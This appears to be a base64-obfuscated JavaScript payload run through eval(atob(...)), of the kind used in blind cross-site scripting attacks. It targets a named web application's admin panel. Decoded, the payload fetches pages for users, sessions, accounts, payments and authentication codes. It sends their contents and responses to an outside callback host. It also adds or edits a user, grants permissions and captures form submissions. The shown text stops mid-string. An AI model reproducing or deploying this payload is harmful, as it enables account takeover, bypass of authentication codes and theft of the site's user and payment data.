eval(atob('dmFyIGNvbGxlY3RfcGFnZV9saXN0MiA9IFsiL0hvbWUvTG9hZFN5c3RlbUFjY291bnRzIiwiL0hvbWUvTG9hZFJlcVNpZ25VcHMiLCIvSG9tZS9Mb2FkVXNlcnMiLCIvSG9tZS9Mb2FkU2Vzc2lvbnMiLCIvSG9tZS9Mb2FkQ3VzdG9tZXJzIiwiL0hvbWUvTG9hZFVzZXJzR3JvdXBzIiwiL0hvbWUvQWRkRWRpdFVzZXIiLCIvSG9tZS9HZXRFZGl0VXNlciIsIi9Ib21lL0dldEF1dGhDb2RlIiwiL0hvbWUvU2tpcEF1dGhDb2RlIiwiL0hvbWUvTG9hZEFsbG93ZWRVc2VycyIsIi9Ib21lL0xvYWRTZXR0aW5ncyIsIi9Ib21lL0xvYWRVV2ViUGVybWlzc2lvbiIsIi9Ib21lL0xvYWRHV2ViUGVybWlzc2lvbiIsIi9SZXBvcnQvTG9hZFRyYW5zZmVyUmVjZWl2aW5nIiwiL0hvbWUvTG9hZEdBbmRyb2lkUGVybWlzc2lvbiIsIi9Ib21lL0xvYWRVQW5kcm9pZFBlcm1pc3Npb24iLCIvSG9tZS9Mb2FkQVBLVXBkYXRlcyIsIi9SZXBvcnQvTG9hZEVQWVBheW1lbnRzIiwiL0hvbWUvTG9hZFRhcmdldHMiLCIvUmVwb3J0L0dldEFjdGl2ZUFjY291bnRzIiwiL1JlcG9ydC9HZXRPbmxpbmVTZXNzaW9uIiwiL1JlcG9ydC9HZXRPbmxpbmVVc2VycyIsIi9SZXBvcnQvR2V0VG90YWxSZXBvcnQiLCIvSG9tZS9HZXRDYXJkTW9kYWwiXTsKCiAgICAgICAgICAKCiAgICAgICAgICBmdW5jdGlvbiBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICkgewogICAgICAgICAgICAgIHZhciBodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgdmFyIHVybCA9ICJodHRwczovL2JpbmhtZGFuZXguYnhzcy5pbi9wYWdlX2NhbGxiYWNrIjsKICAgICAgICAgICAgICBodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgICAgICAgICAgIGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICAgICAgICBodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICBpZihodHRwLnJlYWR5U3RhdGUgPT0gNCAmJiBodHRwLnN0YXR1cyA9PSAyMDApIHsKCiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaHR0cC5zZW5kKCBKU09OLnN0cmluZ2lmeSggcGFnZV9kYXRhICkgKTsKICAgICAgICAgIH0KCiAgICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VfZGF0YTIoIHBhdGggKSB7CiAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgdmFyIGZ1bGxfdXJsID0gIi8vIiArIGRvY3VtZW50LmRvbWFpbiArIHBhdGgKICAgICAgICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2VfZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBhZ2VfaHRtbCI6IHhoci5yZXNwb25zZVRleHQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ1cmkiOiBmdWxsX3VybAogICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMiggcGFnZV9kYXRhICk7CiAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgeGhyLm9wZW4oJ1BPU1QnLCBmdWxsX3VybCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24vanNvbiIpOwogICAgICAgICAgICAgICAgICB4aHIuc2VuZChKU09OLnN0cmluZ2lmeSh7fSkpOwogICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KCiAgICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VzMigpIHsKICAgICAgICAgICAgICBmb3IoIHZhciBpID0gMDsgaSA8IGNvbGxlY3RfcGFnZV9saXN0Mi5sZW5ndGg7IGkrKyApIHsKICAgICAgICAgICAgICAgICAgLy8gTWFrZSBzdXJlIHRoZSBwYXRoIGlzIGNvcnJlY3RseSBmb3JtYXR0ZWQKICAgICAgICAgICAgICAgICAgaWYoIGNvbGxlY3RfcGFnZV9saXN0MltpXS5jaGFyQXQoMCkgIT0gIi8iICkgewogICAgICAgICAgICAgICAgICAgICAgY29sbGVjdF9wYWdlX2xpc3QyW2ldID0gIi8iICsgY29sbGVjdF9wYWdlX2xpc3QyW2ldOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIGNvbGxlY3RfcGFnZV9kYXRhMiggY29sbGVjdF9wYWdlX2xpc3QyW2ldICk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgfQoKdmFyIGNvbGxlY3RfcGFnZV9saXN0MyA9IFsiL0hvbWUvQWRkRWRpdFVzZXIiLCIvSG9tZS9HZXRFZGl0VXNlciIsIi9Ib21lL0dldEF1dGhDb2RlIiwiL0hvbWUvU2tpcEF1dGhDb2RlIiwiL0hvbWUvTG9hZEFsbG93ZWRVc2VycyIsIi9Ib21lL0xvYWRTZXR0aW5ncyIsIi9Ib21lL0xvYWRVV2ViUGVybWlzc2lvbiIsIi9Ib21lL0xvYWRHV2ViUGVybWlzc2lvbiIsIi9SZXBvcnQvTG9hZFRyYW5zZmVyUmVjZWl2aW5nIiwiL0hvbWUvTG9hZEdBbmRyb2lkUGVybWlzc2lvbiIsIi9Ib21lL0xvYWRVQW5kcm9pZFBlcm1pc3Npb24iLCIvSG9tZS9Mb2FkQVBLVXBkYXRlcyIsIi9SZXBvcnQvTG9hZEVQWVBheW1lbnRzIiwiL0hvbWUvTG9hZFRhcmdldHMiLCIvUmVwb3J0L0dldEFjdGl2ZUFjY291bnRzIiwiL1JlcG9ydC9HZXRPbmxpbmVTZXNzaW9uIiwiL1JlcG9ydC9HZXRPbmxpbmVVc2VycyIsIi9SZXBvcnQvR2V0VG90YWxSZXBvcnQiLCIvSG9tZS9HZXRDYXJkTW9kYWwiXTsKCiAgICAgICAgICBmdW5jdGlvbiBzZW5kX2NvbGxlY3RlZF9wYWdlMyggcGFnZV9kYXRhICkgewogICAgICAgICAgICAgIHZhciBodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgdmFyIHVybCA9ICJodHRwczovL2JpbmhtZGFuZXguYnhzcy5pbi9wYWdlX2NhbGxiYWNrIjsKICAgICAgICAgICAgICBodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgICAgICAgICAgIGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICAgICAgICBodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICBpZihodHRwLnJlYWR5U3RhdGUgPT0gNCAmJiBodHRwLnN0YXR1cyA9PSAyMDApIHsKCiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaHR0cC5zZW5kKCBKU09OLnN0cmluZ2lmeSggcGFnZV9kYXRhICkgKTsKICAgICAgICAgIH0KCiAgICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VfZGF0YTMoIHBhdGggLGlkICkgewogICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgIHZhciBmdWxsX3VybCA9ICIvLyIgKyBkb2N1bWVudC5kb21haW4gKyBwYXRoCiAgICAgICAgICAgICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICAgICAgICAgICAgeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlX2RhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwYWdlX2h0bWwiOiB4aHIucmVzcG9uc2VUZXh0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidXJpIjogZnVsbF91cmwKICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTMoIHBhZ2VfZGF0YSApOwogICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIHhoci5vcGVuKCdQT1NUJywgZnVsbF91cmwsIHRydWUpOwogICAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKTsKICAgICAgICAgICAgICAgICAgeGhyLnNlbmQoSlNPTi5zdHJpbmdpZnkoe0lEOmlkfSkpOwogICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KCiAgICAgICAgICAKCiAgICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VzMyhpZCkgewogICAgICAgICAgICAgIGZvciggdmFyIGkgPSAwOyBpIDwgY29sbGVjdF9wYWdlX2xpc3QzLmxlbmd0aDsgaSsrICkgewogICAgICAgICAgICAgICAgICAvLyBNYWtlIHN1cmUgdGhlIHBhdGggaXMgY29ycmVjdGx5IGZvcm1hdHRlZAogICAgICAgICAgICAgICAgICBpZiggY29sbGVjdF9wYWdlX2xpc3QzW2ldLmNoYXJBdCgwKSAhPSAiLyIgKSB7CiAgICAgICAgICAgICAgICAgICAgICBjb2xsZWN0X3BhZ2VfbGlzdDNbaV0gPSAiLyIgKyBjb2xsZWN0X3BhZ2VfbGlzdDJbaV07CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgY29sbGVjdF9wYWdlX2RhdGEzKCBjb2xsZWN0X3BhZ2VfbGlzdDNbaV0gLGlkICk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgfQoKCiAgICAgICAgICBmdW5jdGlvbiBjb2xsZWN0X3BhZ2VfZGF0YTQoICkgewogICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgIHZhciBmdWxsX3VybCA9ICIvLyIgKyBkb2N1bWVudC5kb21haW4gKyAiL0hvbWUvQWRkRWRpdFVzZXIiOwogICAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICAgIHhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgIGlmICh4aHIucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZV9kYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGFnZV9odG1sIjogeGhyLnJlc3BvbnNlVGV4dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInVyaSI6IGZ1bGxfdXJsCiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UzKCBwYWdlX2RhdGEgKTsKICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICB4aHIub3BlbignUE9TVCcsIGZ1bGxfdXJsLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi9qc29uIik7CiAgICAgICAgICAgICAgICAgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHtJRDoxOCxUaGVOdW1iZXI6MTIsVXNlck5hbWU6IkUtRS8gJ0QtKEo0SiIsR3JvdXBJRDowLEdyb3VwTmFtZToiJS8nMSkgJ0RGOCdFIixJc0Rpc2FibGVkOmZhbHNlLE5vdGVzOiIiLFVzZXJUeXBlSUQ6MCxVc2VyVHlwZToiV2ViIixFbnRyeVVzZXI6IkUvSjEgJ0RGOCdFIixFbnRlclRpbWU6IjMwLTA3LTIwMjMgMTE6NDQ6NTIgUE0ifSkpOwogICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KCgogICAgICAgICAgZnVuY3Rpb24gY29sbGVjdF9wYWdlX2RhdGE1KHVpZCxpZCApIHsKICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICB2YXIgZnVsbF91cmwgPSAiLy8iICsgZG9jdW1lbnQuZG9tYWluICsgIi9Ib21lL0FkZFVzZXJXZWJQZXJtaXNzaW9uIjsKICAgICAgICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2VfZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBhZ2VfaHRtbCI6IHhoci5yZXNwb25zZVRleHQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ1cmkiOiBmdWxsX3VybAogICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMyggcGFnZV9kYXRhICk7CiAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgeGhyLm9wZW4oJ1BPU1QnLCBmdWxsX3VybCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24vanNvbiIpOwogICAgICAgICAgICAgICAgICB4aHIuc2VuZChKU09OLnN0cmluZ2lmeSh7VGhlVXNlcklEOnVpZCxJRDppZCxUaGVOYW1lOiJFLUUvICdELShKNEoiLFRoZU9iamVjdDoiIixFbnRyeVVzZXI6IkUvSjEgJ0RGOCdFIixFbnRlclRpbWU6IjMwLTA3LTIwMjMgMTE6NDQ6NTIgUE0ifSkpOwogICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgICAgIAoKICAgICAgICAgICAgICAvLyBMb2FkIERhdGEKICAgICAgICAgICAgICBmdW5jdGlvbiBMb2FkRGF0YSgpIHsKICAgICAgICAgICAgICAgIHRyeXsgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICB1cmw6ICJodHRwczovL2FwcC5lcnRpcWFzb2Z0LmNvL0hvbWUvTG9hZFVzZXJzIiwKICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGpxWEhSLCBleGNlcHRpb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RyID0gIi43IyAxQkUgIiArIGpxWEhSLnN0YXR1cy50b1N0cmluZygpICsgIlxuIiArIGpxWEhSLnJlc3BvbnNlSlNPTi5NZXNzYWdlOwogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAKICAgICAgICAgICAgICBmdW5jdGlvbiBBZGRFZGl0VXNlcigpIHsKICAgICAgICAgICAgICAgIHRyeXsgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICB1cmw6ICJodHRwczovL2FwcC5lcnRpcWFzb2Z0LmNvL0hvbWUvQWRkRWRpdFVzZXIiLAogICAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJKU09OIiwKICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeSh7SUQ6MTgsVGhlTnVtYmVyOjEyLFVzZXJOYW1lOiJFLUUvICdELShKNEoiLEdyb3VwSUQ6MCxHcm91cE5hbWU6IiUvJzEpICdERjgnRSIsSXNEaXNhYmxlZDpmYWxzZSxOb3RlczoiIixVc2VyVHlwZUlEOjAsVXNlclR5cGU6IldlYiIsRW50cnlVc2VyOiJFL0oxICdERjgnRSIsRW50ZXJUaW1lOiIzMC0wNy0yMDIzIDExOjQ0OjUyIFBNIn0pLAogICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGpxWEhSLCBleGNlcHRpb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RyID0gIi43IyAxQkUgIiArIGpxWEhSLnN0YXR1cy50b1N0cmluZygpICsgIlxuIiArIGpxWEhSLnJlc3BvbnNlSlNPTi5NZXNzYWdlOwogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICAgICAgICB9fQoKCiAgICAgICAgICAgICAgLy8gRWRpdAogICAgICAgICAgICAgIGZ1bmN0aW9uIEVkaXRQYXNzKGlkKSB7CiAgICAgICAgICAgICAgICB0cnl7ICAkLmFqYXgoewogICAgICAgICAgICAgICAgICAgICAgdXJsOiAiaHR0cHM6Ly9hcHAuZXJ0aXFhc29mdC5jby9Ib21lL0dldEVkaXRVc2VyIiwKICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgICAgZGF0YTogSlNPTi5zdHJpbmdpZnkoeyBJRDogaWQgfSksCiAgICAgICAgICAgICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oanFYSFIsIGV4Y2VwdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoc3RyKQogICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICAgIH19CgogICAgICAgICAgICAgIC8vIFNob3dBdXRoQ29kZQogICAgICAgICAgICAgIGZ1bmN0aW9uIFNob3dBdXRoQ29kZShpZCkKICAgICAgICAgICAgICB7IHRyeXsKICAgICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICAgIHVybDogImh0dHBzOi8vYXBwLmVydGlxYXNvZnQuY28vSG9tZS9HZXRBdXRoQ29kZSIsCiAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KHsgSUQ6IGlkIH0pLAogICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEubWVzc2FnZSkKICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oanFYSFIsIGV4Y2VwdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoc3RyKQogICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICAgIH0gIH0KCiAgICAgICAgICAgICAgZnVuY3Rpb24gU2tpcEF1dGhDb2RlKGlkKSB7CiAgICAgICAgICAgICAgICB0cnl7ICAkLmFqYXgoewogICAgICAgICAgICAgICAgICAgICAgdXJsOiAiaHR0cHM6Ly9hcHAuZXJ0aXFhc29mdC5jby9Ib21lL1NraXBBdXRoQ29kZSIsCiAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgICBkYXRhVHlwZTogIkpTT04iLAogICAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IEpTT04uc3RyaW5naWZ5KHsgSUQ6IGlkIH0pLAogICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEubWVzc2FnZSkKICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oanFYSFIsIGV4Y2VwdGlvbikgewogICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzdHIgPSAiLjcjIDFCRSAiICsganFYSFIuc3RhdHVzLnRvU3RyaW5nKCkgKyAiXG4iICsganFYSFIucmVzcG9uc2VKU09OLk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9jb2xsZWN0ZWRfcGFnZTIoc3RyKQogICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoIGUgKSB7CiAgICAgICAgICAgICAgICAgIH0gIH0KCiAgICAgICAgICAgICAgLy8gR2V0IE1vZGFsCiAgICAgICAgICAgICAgZnVuY3Rpb24gR2V0TW9kYWwoaWQsIE9UeXBlKSB7CiAgICAgICAgICAgICAgICB0cnl7ICB2YXIgQWN0aW9uTmFtZSA9ICJBZGRFZGl0VXNlciI7CiAgICAgICAgICAgICAgICAgIGlmIChPVHlwZSA9PSBudWxsKSBPVHlwZSA9IDI7CiAgICAgICAgICAgICAgICAgIGlmIChPVHlwZSA9PSAzKSB7CiAgICAgICAgICAgICAgICAgICAgICBPVHlwZSA9IDI7CiAgICAgICAgICAgICAgICAgICAgICBBY3Rpb25OYW1lID0gIkVkaXRVc2VyUGFzc3dvcmQiOyAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICB1cmw6ICJodHRwczovL2FwcC5lcnRpcWFzb2Z0LmNvL0hvbWUvR2V0TW9kYWwiLAogICAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgICAgZGF0YTogSlNPTi5zdHJpbmdpZnkoeyBNb2RhbFRpdGxlOiAiJiN4NjJGOyYjeDY0NDsmI3g2NEE7JiN4NjQ0OyAmI3g2Mjc7JiN4NjQ0OyYjeDY0NTsmI3g2MzM7JiN4NjJBOyYjeDYyRTsmI3g2MkY7JiN4NjQ1OyYjeDY0QTsmI3g2NDY7IiwgQWN0aW9uTmFtZTogQWN0aW9uTmFtZSwgQ29udHJvbGxlck5hbWU6ICJIb21lIiwgSUQ6IGlkLCBvcFR5cGU6IE9UeXBlIH0pLAogICAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBmcm0gPSAkKCcjbW9kYWxGb3JtJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgZnJtLnN1Ym1pdChmdW5jdGlvbihlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHNlbmREYXRhID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZybS5zZXJpYWxpemVBcnJheSgpLm1hcChmdW5jdGlvbihuLCBpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kRGF0YVtuWyduYW1lJ11dID0gblsndmFsdWUnXTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogZnJtLmF0dHIoJ2FjdGlvbicpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGFUeXBlOiAiSlNPTiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiAoSlNPTi5zdHJpbmdpZnkoc2VuZERhdGEpLnJlcGxhY2UoYCJ0cnVlImAsICJ0cnVlIikucmVwbGFjZShgImZhbHNlImAsICJmYWxzZSIpKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpIH